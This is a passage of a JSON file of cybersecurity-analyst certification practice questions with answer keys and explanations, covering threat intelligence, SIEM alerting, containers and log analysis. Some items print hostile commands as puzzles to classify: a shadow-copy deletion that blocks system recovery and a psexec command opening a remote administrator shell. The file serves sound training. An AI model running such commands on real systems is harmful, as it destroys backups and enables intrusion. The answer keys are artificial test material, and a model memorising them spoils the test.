obfuscation"},{"id":"d1-69","set":"d1","ch":4,"d":1,"q":"Michelle wants to determine if a pulse she is reviewing in AlienVault OTX is reliable. Which of the following is the best indicator of quality for a pulse?","o":["The pulse score","The number of times the pulse has been updated","The number of data points in the pulse","Community feedback"],"a":3,"e":"Since OTX is an open threat intelligence platform, one of the best ways to determine quality of pulses is community feedback. There is no pulse score; updates to a pulse are not a useful indicator of quality, although more recent pulses are more likely to be relevant than older pulses; and the number of data points in the pulse is not a quality indicator either.","l":"c4-collect","l2":"c3-tip-edr","k":"threat intelligence pulse reliability"},{"id":"d1-70","set":"d1","ch":3,"d":1,"q":"Lisa has discovered what she believes is embedded Base64 encoded data being exfiltrated via DNS queries:\n<pre>\n<code>Q3VyaW91cyB0ZXN0IHRha2VycyBhcmUgdGhlIGJlc3Qh</code>\n</pre>\n<p>What tool can she use to easily decode the Base64-encoded string that she found?</p>","o":["Strings","CyberChef","chmod","<code>convert.exe</code>"],"a":1,"e":"CyberChef provides Base64 decoding capabilities via an easy to use web interface. It provides a multitude of other capabilities as well. None of the other tools listed provide the capability to decode Base64 strings, and <code>convert.exe</code> is used to convert filesystems on a volume to FAT32 or NTFS.","l":"c3-tools","l2":"","k":"CyberChef Base64 decoding"},{"id":"d1-71","set":"d1","ch":4,"d":1,"q":"Mark wants to attribute a malware package to an attacker. Which of the following is not a commonly attributable element of a malware package?","o":["Tooling","Attack timelines","Shared infrastructure","Operating system versions"],"a":3,"e":"Threat researchers look at the tools, timelines and common behaviors, and shared infrastructure to help identify threat actors. Using the same operating system, however, is not a commonality that makes a big difference in most cases.","l":"c4-classify","l2":"","k":"threat actor attribution indicators"},{"id":"d1-72","set":"d1","ch":4,"d":1,"q":"What is the most important security benefit of attributing a malware package to a threat actor?","o":["It helps with insurance claims.","It can help identify other likely behaviors.","It provides someone to blame.","It can help with media coverage."],"a":1,"e":"Attributing a malware package or attack to a threat actor can help predict their other related behaviors and assist with future threat hunting related to the event.","l":"c4-classify","l2":"c4-hunt","k":"threat actor attribution benefits"},{"id":"d1-73","set":"d1","ch":4,"d":1,"q":"Based on the Pyramid of Pain, place the following items in order from easiest to hardest for threat actors to deal with not having: tools, domain names, hash values?","o":["Hash values, domain names, tools","Domain names, hash values, tools","Hash values, tools, domain names","Tools, domain names, hash values"],"a":0,"e":"From easiest to hardest the Pyramid of Pain lists hash values, IP addresses, domain names, network and host artifacts, tools, and TTPs.","l":"c4-classify","l2":"","k":"Pyramid of Pain"},{"id":"d1-74","set":"d1","ch":2,"d":1,"q":"What three layers make up a software-defined network?","o":["Application, Datagram, and Physical layers","Application, Control, and Infrastructure layers","Control, Infrastructure, and Session layers","Data link, Presentation, and Transport layers"],"a":1,"e":"Software-defined networks (SDNs) consist of three major layers: the Application layer, where information about the network is used to improve flow, configuration, and other items; the Control layer, which is where the logic from SDN controllers control the network infrastructure; and the Infrastructure layer, which is made up of the networking equipment. If you’re not deeply familiar with SDNs, you can address questions like this by reviewing what you do know. The other three options contain elements of the Open Systems Interconnection (OSI) model but don’t make sense in the context of SDN.","l":"c2-netarch","l2":"","k":"SDN architecture layers"},{"id":"d1-75","set":"d1","ch":6,"d":1,"q":"Micah is designing a containerized application security environment and wants to ensure that the container images he is deploying do not introduce security issues due to vulnerable applications. What can he integrate into the CI/CD pipeline to help prevent this?","o":["Automated checking of application hashes against known good versions","Automated vulnerability scanning","Automated fuzz testing","Automated updates"],"a":1,"e":"If Micah implements automated vulnerability scanning, he can check to see if the applications that are about to be deployed have known vulnerabilities. Automated patching will also help with this, but will only apply available patches and will not assess whether there are configuration vulnerabilities or unpatched vulnerabilities. Fuzz testing can help to test if the applications have issues with unexpected input but will not address most vulnerabilities, and hashing will only tell him if he is running the version of code that he expects to, not if it is vulnerable.","l":"c6-tools","l2":"c2-infra","k":"container vulnerability scanning CI/CD"},{"id":"d1-76","set":"d1","ch":4,"d":1,"q":"Carmen’s SIEM flags an EDR event from a workstation that lists the following command being run:\n<pre>\n<code>wmic shadowcopy delete /nointeractive</code>\n</pre>\n<p>She wants to categorize this threat according to MITRE’s ATT&amp;CK framework. What technique should she categorize it as?</p>","o":["ID: T1221 Template Injection","ID: T1112 Modify Registry","ID: T1212 Exploitation for Credential Access","ID: T1490 Inhibit System Recovery"],"a":3,"e":"This can be a tough question, but there are hints inside of the command. Windows shadow copies are snapshots of volumes or files, and can be used to restore. There’s only one answer that points to a backup or restoration related item—inhibiting system recovery.\n<p>This command deletes existing Windows shadow copies, which are used to restore files. That inhibits system recovery, which ATT&amp;CK describes as “Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.” Template injection modifies user document templates to attempt to conceal malicious code or force authentication attempts. This doesn’t modify the Registry, nor does it attempt credential access.</p>","l":"c4-classify","l2":"c9-frameworks","k":"ATT&CK Inhibit System Recovery"},{"id":"d1-77","set":"d1","ch":2,"d":1,"q":"Answer the question based on your knowledge of container security and the following scenario.\n<p>Brandon has been tasked with designing the security model for container use in his organization. He is working from the NIST SP 800-190 document and wants to follow NIST recommendations wherever possible.</p>\n<p>Brandon needs to deploy containers with different purposes, data sensitivity levels, and threat postures to his container environment. How should he group them?</p>","o":["Segment containers by purpose","Segment containers by data sensitivity","Segment containers by threat model","All of the above"],"a":3,"e":"Where possible, NIST recommends segmenting by purpose, data sensitivity, and threat model to separate OS kernels.","l":"c2-infra","l2":"","k":"NIST SP 800-190 container segmentation"},{"id":"d1-78","set":"d1","ch":6,"d":1,"q":"Answer the question based on your knowledge of container security and the following scenario.\n<p>Brandon has been tasked with designing the security model for container use in his organization. He is working from the NIST SP 800-190 document and wants to follow NIST recommendations wherever possible.</p>\n<p>What issues should Brandon consider before choosing to use the vulnerability management tools he has in his non-container-based security environment?</p>","o":["Vulnerability management tools may make assumptions about host durability.","Vulnerability management tools may make assumptions about update mechanisms and frequencies.","Both A and B.","Neither A nor B."],"a":2,"e":"The NIST 800-190 guidelines note that traditional vulnerability management tools may make assumptions like those in options A and B regarding the systems and applications they are scanning. Since containers are ephemeral and may be updated and changed very frequently, a traditional vulnerability scanning and management approach is likely to be a poor fit for a containerized environment.","l":"c6-requirements","l2":"c2-infra","k":"container vulnerability scanning challenges"},{"id":"d1-79","set":"d1","ch":2,"d":1,"q":"What key functionality do enterprise privileged account management tools provide?","o":["Password creation","Access control to individual systems","Entitlement management across multiple systems","Account expiration tools"],"a":2,"e":"The most distinctive feature of privileged account management tools for enterprise use is the ability to manage entitlements across multiple systems throughout an enterprise IT environment. Broader identity and access management systems for enterprises provide user account management and life-cycle services, including account expiration tools and password life-cycle management capabilities.","l":"c2-federation","l2":"","k":"privileged access management entitlements"},{"id":"d1-80","set":"d1","ch":2,"d":1,"q":"Amira wants to deploy an open standard–based single sign-on (SSO) tool that supports both authentication and authorization. What open standard should she look for if she wants to federate with a broad variety of identity providers and service providers?","o":["LDAP","SAML","OAuth","OpenID Connect"],"a":1,"e":"SAML provides all of the capabilities Amira is looking for. Unlike SAML, OAuth is an authorization standard, not an authentication standard. LDAP provides a directory and can be used for authentication but would need additional tools to be used as described. Finally, OpenID Connect is an authentication layer on top of OAuth, which is an authorization framework. Together, they would also meet the needs described here, but individually they do not.","l":"c2-federation","l2":"c2-iam","k":"SAML federation and SSO"},{"id":"d1-81","set":"d1","ch":2,"d":1,"q":"Adam is testing code written for a client-server application that handles financial information and notes that traffic is sent between the client and server via TCP port 80. What should he check next?","o":["If the server stores data in unencrypted form","If the traffic is unencrypted","If the systems are on the same network","If usernames and passwords are sent as part of the traffic"],"a":1,"e":"Adam knows that TCP/80 is the normal port for unencrypted HTTP traffic. As soon as he sees the traffic, he should immediately check if the traffic is unencrypted. If it is, his first recommendation will likely be to switch to TLS encrypted traffic. Once that is complete, he can worry about whether data is encrypted at rest and if usernames and passwords are passed as part of the traffic, which might be acceptable if it was protected with TLS!","l":"c2-crypto","l2":"c8-sdlc","k":"unencrypted HTTP traffic inspection"},{"id":"d1-82","set":"d1","ch":2,"d":1,"q":"Faraj wants to use statistics gained from live analysis of his network to programmatically change its performance, routing, and optimization. Which of the following technologies is best suited to his needs?","o":["Serverless","Software-defined networking","Physical networking","Virtual private networks (VPNs)"],"a":1,"e":"Software-defined networking (SDN) is designed to handle changing traffic patterns and use of data to drive network configurations, routing, and optimization efforts. Faraj’s best option is to use a software-defined network. Serverless is a technology that runs compute runtimes rather than a network, and a VPN is used to connect networks or systems together via a private channel.","l":"c2-netarch","l2":"","k":"software-defined networking"},{"id":"d1-83","set":"d1","ch":2,"d":1,"q":"Elaine’s team has deployed an application to a cloud-hosted serverless environment. Which of the following security tools can she use in that environment?","o":["Endpoint antivirus","Endpoint DLP","IDS for the serverless environment","None of the above"],"a":3,"e":"Serverless environments are a shared service, and since there is not a system that is accessible to consumers, there is nowhere to install endpoint tools. Similarly, network IPSs cannot be placed in front of a shared resource. Elaine should also be aware that any flaw with the underlying serverless environment will likely impact all of the service hosting systems.","l":"c2-infra","l2":"c1-endpoint-pentest","k":"serverless security limitations"},{"id":"d1-84","set":"d1","ch":1,"d":1,"q":"Lucca wants to quickly perform event correlation in an automated and low-cost way that allows for useful output despite large and relatively complex IoC datasets. What tool or process should he consider?","o":["A large pool of dedicated security analysts","An advanced SIEM tool using rule-based analysis","A group of security analysts and a larger pool of entry-level staff who can filter data","An AI-based analysis tool with an appropriate prompt"],"a":3,"e":"Artificial intelligence tools are quickly growing in popularity for this type of solution. An appropriate prompt combined with a RAG (retrieval-augmented generation) knowledge source can provide efficient and cost-effective analysis, allowing expensive security experts to focus on identified events. Both staff-heavy answers are likely to be more costly than AI, particularly in a 24<span class=\"DengXian\">×</span>7 environment. SIEM with rules can perform some of this task, but building rules does not allow for the adaptability of an LLM approach.","l":"c1-ai","l2":"c3-tools","k":"AI in security operations"},{"id":"d1-85","set":"d1","ch":2,"d":1,"q":"Kubernetes and Docker are examples of what type of technology?","o":["Encryption","Software-defined networking","Containerization","Serverless"],"a":2,"e":"Kubernetes and Docker are both examples of containerization tools.","l":"c2-infra","l2":"","k":"containerization technology"},{"id":"d1-86","set":"d1","ch":2,"d":1,"q":"Nathan is designing the logging infrastructure for his company and wants to ensure that a compromise of a system will not result in the loss of that system’s logs. What should he do to protect the logs?","o":["Limit log access to administrators.","Encrypt the logs.","Rename the log files from their common name.","Send the logs to a remote server."],"a":3,"e":"Nathan’s best option is to send the logs to a remote server. The server should be protected to ensure that the same exploits that might compromise other systems will not impact the secure log storage server or service. In many organizations, a SIEM device or security logging tool like ELK or Splunk may be used to store and work with these logs.","l":"c2-logging","l2":"","k":"centralized remote logging"},{"id":"d1-87","set":"d1","ch":2,"d":1,"q":"Ansel knows he wants to use federated identities in a project he is working on. Which of the following should not be among his choices for a federated identity protocol?","o":["OpenID","SAML","OAuth","Authman"],"a":3,"e":"OpenID, SAML, and OAuth are all commonly used protocols for federated identity. Ansel will need to better understand what the use cases for federated identity are in his environment and which organizations he will federate with before he chooses a protocol to implement and may eventually need to support more than one. Authman is a tool used to manage web user login files and is not a protocol.","l":"c2-federation","l2":"","k":"federated identity protocols"},{"id":"d1-88","set":"d1","ch":3,"d":1,"q":"James uploads a file that he believes is potentially a malware package to VirusTotal and receives positive results, but the file is identified with multiple different malware package names. What has most likely occurred?","o":["The malware is polymorphic and is being identified as multiple viruses because it is changing.","Different antimalware engines call the same malware package by different names.","VirusTotal has likely misidentified the malware package, and this is a false positive.","The malware contains multiple malware packages, resulting in the matches."],"a":1,"e":"Sites like VirusTotal run multiple antimalware engines, which may use different names for malware packages. This can result in a malware package apparently matching multiple different infections.","l":"c3-filesandbox","l2":"c3-tip-edr","k":"multiscanner malware naming discrepancies"},{"id":"d1-89","set":"d1","ch":3,"d":1,"q":"Isaac wants to monitor live memory usage on a Windows system. What tool should he use to see memory usage in a graphical user interface?","o":["MemCheck","Performance Monitor","WinMem","<code>top</code>"],"a":1,"e":"The Windows Performance Monitor (<code>perfmon.exe</code>) provides a live view of memory usage per running application or service. This can be useful for live memory analysis. MemCheck and WinMem were made up for this question, and <code>top</code> is a useful Linux tool for checking memory utilization. If you aren’t familiar with tools like this, you may want to spend some time with Windows and Linux common command cheat sheets like the Linux sheet found at <code><a href=\"http://www.linuxtrainingacademy.com/linux-commands-cheat-sheet\">www.linuxtrainingacademy.com/linux-commands-cheat-sheet</a></code>.","l":"c3-host","l2":"","k":"Windows Performance Monitor"},{"id":"d1-90","set":"d1","ch":3,"d":1,"q":"Abul wants to identify typical behavior on a Windows system using a built-in tool to understand memory, CPU, and disk utilization. What tool can he use to see both real-time performance and over a period of time?","o":["<code>sysmon</code>","<code>sysgraph</code>","<code>resmon</code>","<code>resgraph</code>"],"a":2,"e":"The Windows Resource Monitor (<code>resmon.exe</code>) application is a useful tool to both see real-time data and graph it over time, allowing Abul to watch for spikes and drops in usage that may indicate abnormal behavior.","l":"c3-host","l2":"","k":"Windows Resource Monitor"},{"id":"d1-91","set":"d1","ch":6,"d":1,"q":"Jonas wants to use a port scanner to identify potential rogue devices on a network that hosts his organization’s ICS and SCADA devices. Why might he be told he cannot use this process to identify potential rogues?","o":["Scans may not be permitted by certifying agencies.","Scans may result in false positives.","Scans may crash devices.","Scans may identify vulnerabilities."],"a":2,"e":"Operational technology devices like ICS and SCADA systems have limited memory, CPU, and other resources. Port scans, particularly against potentially fragile services, may lead to crashes or denial of service conditions resulting in downtime. Certifying agencies typically don’t set limits on scanning, and false positives and vulnerabilities aren’t real concerns when attempting to enumerate potential rogue devices.","l":"c6-remediation","l2":"c7-web-ot","k":"fragile ICS/SCADA scanning risks"},{"id":"d1-92","set":"d1","ch":3,"d":1,"q":"What does execution of <code>wmic.exe</code>, <code>powershell.exe</code>, or <code>winrm.vbs</code> most likely indicate if you discover one or more was run on a typical end user’s workstation?","o":["A scripted application installation","Remote execution of code","A scripted application uninstallation","A zero-day attack"],"a":1,"e":"PowerShell, <code>wmic</code>, and <code>winrm.vbs</code> are all commonly used for remote execution of code or scripts, and finding them in use on a typical workstation should cause you to be worried as most users will never use any of the three.","l":"c3-host","l2":"","k":"LOLBins and remote execution"},{"id":"d1-93","set":"d1","ch":3,"d":1,"q":"Ben is reviewing network traffic logs and notices HTTP and HTTPS traffic originating from a workstation. What TCP ports should he expect to see this traffic sent to under most normal circumstances?","o":["80 and 443","22 and 80","80 and 8088","22 and 443"],"a":0,"e":"Most common HTTP traffic will go to port 80—and then be redirected to 443 due to broad HTTPS adoption, and HTTPS native traffic will go to 443. The third most common port for web traffic is 8080 and would be a reasonable but significantly less common option. While other ports may be in use, if you aren’t expecting traffic to nonstandard HTTP and HTTPS ports, you may want to investigate the traffic.","l":"c3-network","l2":"c5-portscan","k":"standard web traffic ports"},{"id":"d1-94","set":"d1","ch":3,"d":1,"q":"Lucy is an SOC operator for her organization and is responsible for monitoring her organization’s SIEM and other security devices. Her organization has both domestic and international sites, and many of their employees travel frequently.\n<p>While Lucy is monitoring the SIEM, she notices that all of the log sources from her organization’s New York branch have stopped reporting for the past 24 hours. What type of detection rules or alerts should she configure to make sure she is aware of this sooner next time?</p>","o":["Heuristic","Behavior","Availability","Anomaly"],"a":2,"e":"Availability analysis targets whether a system or service is working as expected. Although a SIEM may not have direct availability analysis capabilities, reporting on when logs or other data is not received from source systems can help detect outages. Ideally, Lucy’s organization should be using a system monitoring tool that can alarm on availability issues as well as common system problems such as excessive memory, network, disk, or CPU usage.","l":"c3-tools","l2":"c3-cloud-social","k":"SIEM availability monitoring"},{"id":"d1-95","set":"d1","ch":3,"d":1,"q":"Lucy is an SOC operator for her organization and is responsible for monitoring her organization’s SIEM and other security devices. Her organization has both domestic and international sites, and many of their employees travel frequently.\n<p>After her discovery in the previous question, Lucy is tasked with configuring alerts that are sent to system administrators. She builds a rule that can be represented in pseudocode as follows:</p>\n<p>Send an SMS alert every 30 seconds when systems do not send logs for more than one minute.</p>\n<p>The average administrator at Lucy’s organization is responsible for 150–300 machines.</p>\n<p>What danger does Lucy’s alert create?</p>","o":["A DDoS that causes administrators to not be able to access systems.","A network outage.","Administrators may ignore or filter the alerts.","A memory spike."],"a":2,"e":"When faced with massive numbers of notification messages that are sent too aggressively, administrators are likely to ignore or filter the alerts. Once they do, they are unlikely to respond to actual issues, causing all of the advantages of monitoring to be lost. If she doesn’t spend some time identifying reasonable notification thresholds and frequencies, Lucy’s next conversation is likely to be with an angry system administrator or manager.","l":"c3-tools","l2":"c1-efficiency","k":"alert fatigue"},{"id":"d1-96","set":"d1","ch":3,"d":1,"q":"Lucy is a SOC operator for her organization and is responsible for monitoring her organization’s SIEM and other security devices. Her organization has both domestic and international sites, and many of their employees travel frequently.\n<p>Lucy configures an alert that detects when users who do not typically travel log in from other countries. What type of analysis is this?</p>","o":["Trend","Availability","Heuristic","Behavior"],"a":3,"e":"Lucy has configured a behavior-based detection. It is likely that a reasonable percentage of the detections will be legitimate travel for users who typically do not leave the country, but pairing this behavioral detection with other behavioral or anomaly detections can help determine if the login is legitimate.","l":"c3-uba-scripting","l2":"c3-cloud-social","k":"behavior-based anomaly detection"},{"id":"d1-97","set":"d1","ch":8,"d":1,"q":"Disabling unneeded services is an example of what type of activity?","o":["Threat modeling","Incident remediation","Proactive risk assessment","Reducing the threat attack surface area"],"a":3,"e":"Disabling unneeded or risky services is an example of a strategy to reduce the attack surface area of a system or device as part of system hardening. Threat modeling and proactive risk assessment are both activities that focus on preparation, rather than direct systems or technology action, and incident remediation might involve disabling a service, but there isn’t enough information to know this for sure. What we do know for sure is that disabling unneeded services reduces the attack surface area for a system.","l":"c8-controls","l2":"c2-os","k":"attack surface reduction"},{"id":"d1-98","set":"d1","ch":3,"d":1,"q":"Sally has written the following Snort rule. What will it detect?\n<pre>\n<code>alert tcp anyany -&gt; anyany (msg: \"Alert!\"; flow:to_server, </code>\n<code>established; content: \"POST\"; nocase; content:\"/login.php\"; </code>\n<code>nocase; content: \"username=\"; nocase; content: \"password=\"; </code>\n<code>nocase; content:\"'\"; sid:1000016; rev:1;)</code>\n</pre>","o":["A port scan","A web application login","A denial-of-service attack","A SQL injection attack"],"a":1,"e":"Sally’s detection looks for an HTTP <code>POST</code> event to a <code>login.php</code> page with a username and password sent. This is typical of a web application login rather than a port scan, denial-of-service attack, or SQL injection attack.","l":"c3-tools","l2":"","k":"Snort rule analysis"},{"id":"d1-99","set":"d1","ch":3,"d":1,"q":"Ian wants to capture information about privilege escalation attacks on a Linux system. If he believes that an insider is going to exploit a flaw that allows them to use <code>sudo</code> to assume root privileges, where is he most likely to find log information about what occurred?","o":["The <code>sudoers</code> file","<code>/var/log/sudo</code>","<code>/var/log/auth.log</code>","Root’s<code>.bash_log</code>"],"a":2,"e":"The <code>auth.log</code> file on Linux systems will capture <code>sudo</code> events. A knowledgeable attacker is likely to erase or modify the <code>auth.log</code> file, so Ian should make sure that the system is sending these events via syslog to a trusted secure host. The <code>sudoers</code> file stored in <code>/etc/sudoers</code> contains details of which users can use <code>sudo</code> and what rights they have. There is no file called <code>/var/log/sudo</code>, and root’s<code>.bash_log</code> file might contain commands that root has run but won’t have details of the <code>sudo</code> event—there’s no reason for root to <code>sudo</code> to root!","l":"c3-tools","l2":"c2-os","k":"Linux auth.log sudo monitoring"},{"id":"d1-100","set":"d1","ch":3,"d":1,"q":"What type of information can Gabby determine from Tripwire logs on a Linux system if it is configured to monitor a directory?","o":["How often the directory is accessed","If files in the directory have changed","If sensitive data was copied out of the directory","Who has viewed files in the directory"],"a":1,"e":"Tripwire can monitor files and directories for changes, which means Gabby can use it to monitor for files in a directory that have changed. It will not tell you how often the directory is accessed, who viewed files, or if sensitive data was copied out of the directory.","l":"c3-host","l2":"c1-endpoint-pentest","k":"file integrity monitoring"},{"id":"d1-101","set":"d1","ch":3,"d":1,"q":"While reviewing for a system that she suspects attackers may be using LOLBins on, Charlene discovers that a user has recently run the following command in a Windows console window:\n<pre>\n<code>psexec \\\\10.0.11.1 -u Administrator -p examplepw cmd.exe</code>\n</pre>\n<p>What has occurred?</p>","o":["The user has opened a command prompt on their workstation.","The user has opened a command prompt on the desktop of a remote workstation.","The user has opened an interactive command prompt as Administrator on a remote workstation.","The user has opened a command prompt on their workstation as Administrator."],"a":2,"e":"Even if you’re not familiar with the PS tools, you can use your knowledge of Windows command-line tools to figure out what is happening here. We see a remote workstation (it is highly unlikely you would connect to your own workstation this way!) indicated by the <code>\\ip.address</code>, a <code>-u</code> flag likely to mean user ID with the administrator listed, and a <code>-p</code> for password. We know that <code>cmd.exe</code> is the Windows command prompt, so it is reasonable and correct to assume that this will open a remote command prompt for interactive use. If this is a user who isn’t an administrator, Charlene needs to start an incident investigation right away.","l":"c3-host","l2":"","k":"PsExec remote command execution"},{"id":"d1-102","set":"d1","ch":3,"d":1,"q":"While reviewing <code>tcpdump</code> data, Kwame discovers that hundreds of different IP addresses are sending a steady stream of SYN packets to a server on his network. What concern should Kwame have about what is happening?","o":["A firewall is blocking connections from occurring.","An IPS is blocking connections from occurring.","A denial-of-service attack.","An ACK blockage."],"a":2,"e":"SYN floods are a denial-of-service attack technique that is used to exhaust session handlers on systems. A flood of SYNs from many different IP addresses without a completed TCP three-way handshake is often a sign of a SYN flood attack.","l":"c3-network","l2":"c3-tools","k":"SYN flood denial-of-service"},{"id":"d1-103","set":"d1","ch":3,"d":1,"q":"After being prevented from using port scans to identify wired rogues in an operational technology network, Jonas needs to assess systems to identify potential rogue devices. Which of the following techniques is the most efficient way to accomplish his task?","o":["Check MAC address lists from switches against known device hardware addresses.","Manually identify each plugged in device.","Use a network scan tool to check for unknown SSIDs.","Conduct a TCP connect scan of all devices on the network."],"a":0,"e":"Checking known MAC addresses against the list of known MAC addresses seen by switches on his network will allow Jonas to list anything unknown, then go to that switch port and identify the devices. This is far faster than checking each port or device manually. SSIDs are associated with wireless devices like rogue access points, not with wired devices, and not every wired rogue would broadcast a wireless network. Finally, if Jonas has been prohibited from running a port scan, a TCP SYN scan is unlikely to be approved and many modern devices block them with a firewall anyway!","l":"c3-network","l2":"c5-portscan","k":"Rogue device detection via MAC table"},{"id":"d1-104","set":"d1","ch":3,"d":1,"q":"Charles is investigating an unresponsive web application server and runs the <code>netstat</code> command. The output shows a multitude of TCP connections in the established state but with very low traffic rates. What does this IoC indicate?","o":["A denial-of-service attack exhausting the system’s TCP connection pool","A vulnerability scan testing all of the server’s HTTP ports","A bandwidth issue resulting in slow traffic to clients","A CPU load issue resulting in slow responses"],"a":0,"e":"Denial-of-service attacks consume a server’s connection pool by slowly transmitting data target connection pool limits instead of bandwidth, making them easier to accomplish with limited bandwidth. Most servers only provide one or a small number of HTTP service ports; bandwidth issues could be an issue, but no other indicators for the organization are listed that would point to a bandwidth issue; and CPU load is not described and no indicators point to it.","l":"c3-network","l2":"c3-host","k":"Slowloris DoS connection pool exhaustion"},{"id":"d1-105","set":"d1","ch":2,"d":1,"q":"Gabby executes the following command. What is she doing?\n<pre>\n<code>ps -aux | grep apache2 | grep root</code>\n</pre>","o":["Searching for all files owned by root named apache2.","Checking currently running processes with the words apache2 and root both appearing in the output of ps.","Shutting down all apache2 processes run by root.","There is not enough information to answer this question."],"a":1,"e":"The <code>ps</code> utility lists currently running processes, and <code>aux</code> is a set of flags that control which processes are selected. This output is then piped to <code>grep</code>, and all lines with the text <code>apache2</code> will be selected. Then that list will be searched for the text root. This type of multiple piping can help quickly process large volumes of files and thousands or millions of lines of text.","l":"c2-os","l2":"c3-uba-scripting","k":"process monitoring using ps grep"},{"id":"d1-106","set":"d1","ch":3,"d":1,"q":"While reviewing email headers, Saanvi notices an entry that reads as follows:\n<p>From: “John Smith, CIO”&lt;<code>jsmith@example.com</code>&gt; with a Received: parameter that shows <code>mail.demo.com</code> [10.74.19.11].</p>\n<p>Which of the following scenarios is most likely if <code>demo.com</code> is not a domain belonging to the same owner as <code>example.com</code>?</p>","o":["John Smith’s email was forwarded by someone at <code>demo.com</code>.","John Smith’s email was sent to someone at <code>demo.com</code>.","The headers were forged to make it appear to have come from John Smith.","The <code>mail.demo.com</code> server is a trusted email forwarding partner for <code>example.com</code>."],"a":2,"e":"The most likely scenario in this circumstance is that the headers were forged to make the email appear to come from <code>example.com</code>, but the email was actually sent from <code>mail.demo.com</code>.","l":"c3-cloud-social","l2":"c3-filesandbox","k":"Forged email headers analysis"},{"id":"d1-107","set":"d1","ch":3,"d":1,"q":"Fiona wants to prevent email impersonation of individuals inside her company. What technology can best help prevent this?","o":["IMAP","SPF","DKIM","DMARC"],"a":3,"e":"While SPF and DKIM can help, combining them in the form of DMARC can limit trusted senders to only a known list and prove that the domain is the domain that is sending the email; this prevents email impersonation when other organizations also use DMARC.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"Email impersonation prevention with DMARC"},{"id":"d1-108","set":"d1","ch":3,"d":1,"q":"Which of the items from the following list is not typically found in an email header?","o":["Sender IP address","Date","Receiver IP address","Private key"],"a":3,"e":"Email headers contain the message ID, date, to, from, user agent, IP addresses of both the sender and the receiver, and information about the email servers along the path between them. They do not contain a private key.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"Email header fields analysis"},{"id":"d1-109","set":"d1","ch":1,"d":1,"q":"Ian wants to leverage multiple threat flows and is frustrated that they come in different formats. What type of tool might best assist him in combining this information and using it to further streamline his operations?","o":["IPS","OCSP","SOAR","SAML"],"a":2,"e":"Security orchestration, automation, and response (SOAR) systems are designed to correlate information and may be able to combine this information. This is especially true if the system and feeds make use of the Structured Threat Information Expression language (STIX) and TAXII, the protocol used to transfer threat intelligence. STIX and TAXII are open protocols that have been adopted to allow multiple threat sources to be combined effectively. SAML is Security Assertion Markup Language, and OCSP is Online Certificate Status Protocol. Neither of those is useful in processing threat information.","l":"c1-efficiency","l2":"c4-collect","k":"SOAR threat intelligence ingestion"},{"id":"d1-110","set":"d1","ch":4,"d":1,"q":"Cassandra is classifying a threat actor, and she describes the actor as wanting to steal nuclear research data. What term best describes this information?","o":["An alias","A goal","Their sophistication","Their resource level"],"a":1,"e":"The thing that a threat actor wants to do is a goal. Since you might be unfamiliar with some of these terms, when you encounter a question like this, you should rule out what you can. Most questions will have one or more obviously incorrect answers—here that’s likely their resource level and their alias. If you ruled only those two out, you’d have a 50 percent chance of getting a question like this right. In this case, you can likely then guess that wanting to steal nuclear research data is a goal, rather than a statement of sophistication, and move on with the next question.","l":"c4-classify","l2":"","k":"Threat actor goals and motivation"},{"id":"d1-111","set":"d1","ch":3,"d":1,"q":"During a log review, Mei sees repeated firewall entries, as shown here:\n<pre>\n<code>Sep 16 2025 23:01:37: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by</code>\n<code>access-group \"OUTSIDE\" [0x5063b82f, 0x0]</code>\n<code>Sep 16 2025 23:01:38: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by</code>\n<code>access-group \"OUTSIDE\" [0x5063b82f, 0x0]</code>\n<code>Sep 16 2025 23:01:39: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by</code>\n<code>access-group \"OUTSIDE\" [0x5063b82f, 0x0]</code>\n<code>Sep 16 2025 23:01:40: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by</code>\n<code>access-group \"OUTSIDE\" [0x5063b82f, 0x0]</code>\n</pre>\n<p>What service is the remote system most likely attempting to access?</p>","o":["H.323","SNMP","MS-SQL","Oracle"],"a":3,"e":"Oracle databases default to TCP port 1521. Traffic from the “outside” system is being denied when it attempts to access an internal system via that port.","l":"c3-tools","l2":"c7-server-network","k":"Firewall log port 1521 Oracle"},{"id":"d1-112","set":"d1","ch":4,"d":1,"q":"Tracy wants to securely transfer threat intelligence information via HTTPS. What protocol should she use to ensure broad compatibility using an industry standard?","o":["STIX","OSINT","BEC","TAXII"],"a":3,"e":"TAXII, the Trusted Automated Exchange of Intelligence Information, is a commonly used threat intelligence transfer protocol. STIX, Structured Threat Information Expression, is a language used to describe threats, and is conveyed via TAXII (Trusted Automated Exchange of Intelligence Information)—it’s not a protocol. OSINT is open source intelligence, and BEC is business email compromise, neither of which is a threat intelligence transfer protocol.","l":"c4-collect","l2":"","k":"TAXII threat intelligence sharing protocol"},{"id":"d1-113","set":"d1","ch":3,"d":1,"q":"While reviewing Apache logs, Nara sees the following entries as well as hundreds of others from the same source IP address. What should Nara report has occurred?\n<pre>\n<code>[21/Jul/2019:02:18:33 -0500] - - 10.0.1.1 \"GET /scripts/sample.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2019:02:18:35 -0500] - - 10.0.1.1 \"GET /scripts/test.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2019:02:18:37 -0500] - - 10.0.1.1 \"GET /scripts/manage.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2019:02:18:38 -0500] - - 10.0.1.1 \"GET /scripts/download.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2019:02:18:40 -0500] - - 10.0.1.1 \"GET /scripts/update.php\" \"-\" 302 336 0</code>\n<code>[21/Jul/2019:02:18:42 -0500] - - 10.0.1.1 \"GET /scripts/new.php\" \"-\" 302 336 0</code>\n</pre>","o":["A denial-of-service attack","A vulnerability scan","A port scan","A directory traversal attack"],"a":1,"e":"Testing for common sample and default files is a common tactic for vulnerability scanners. Nara can reasonably presume that her Apache web server was scanned using a vulnerability scanner.","l":"c3-cloud-social","l2":"c6-tools","k":"Web server vulnerability scan logs"},{"id":"d1-114","set":"d1","ch":1,"d":1,"q":"Andrea needs to add a firewall rule that will prevent external attackers from conducting topology gathering reconnaissance on her network. Where in the following image should she add a rule intended to block this type of traffic?\n<figure><img alt=\"Network diagram shows a cloud connected to A Firewall, B Router, C Layer 3 distribution switch, and D Windows 